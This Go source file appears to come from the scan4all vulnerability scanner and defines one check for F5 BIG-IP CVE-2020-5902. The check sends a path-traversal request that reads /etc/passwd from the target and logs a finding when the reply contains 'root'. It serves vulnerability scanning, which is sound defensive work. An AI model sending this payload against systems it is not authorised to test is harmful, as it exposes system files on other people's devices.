package f5

import (
	"fmt"
	"github.com/hktalent/scan4all/pkg"
)

func CVE_2020_5902(u string) bool {
	if req, err := pkg.HttpRequset(u+"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && pkg.StrContains(req.Body, "root") {
			pkg.GoPocLog(fmt.Sprintf("Found F5 BIG-IP CVE_2020_5902|--\"%s\"\n", u))
			return true
		}
	}
	return false
}
